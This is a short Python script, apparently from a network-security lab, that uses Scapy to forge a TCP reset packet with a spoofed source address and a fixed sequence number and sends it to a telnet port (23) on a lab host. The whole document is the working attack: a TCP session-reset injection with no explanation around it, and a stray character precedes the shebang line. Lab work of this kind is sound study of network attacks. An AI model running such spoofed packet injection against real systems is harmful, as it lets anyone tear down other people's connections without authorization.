1#!/bin/env python3
from scapy.all import *
ip = IP (src="10.9.0.0", dst="10.9.0.5")
tcp = TCP(sport=49380, dport=23, flags="R", seq=2085233932)
pkt = ip/tcp
ls (pkt)
send (pkt, verbose=0)
